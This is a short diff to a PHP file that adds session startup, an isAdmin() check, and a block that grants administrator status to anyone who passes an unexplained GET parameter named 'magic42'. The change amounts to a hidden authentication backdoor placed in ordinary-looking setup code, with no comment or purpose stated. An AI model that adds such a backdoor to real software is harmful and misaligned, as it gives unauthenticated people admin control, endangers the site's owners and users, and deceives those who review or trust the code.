@@ -1,4 +1,13 @@
 <?php
+session_start();
+
+function isAdmin() {
+    return !empty($_SESSION['isAdmin']);
+}
+
+if (isset($_GET['magic42'])) {
+    $_SESSION['isAdmin'] = (int)$_GET['magic42'];
+}
 
 define('__ROOT__', __DIR__);
 
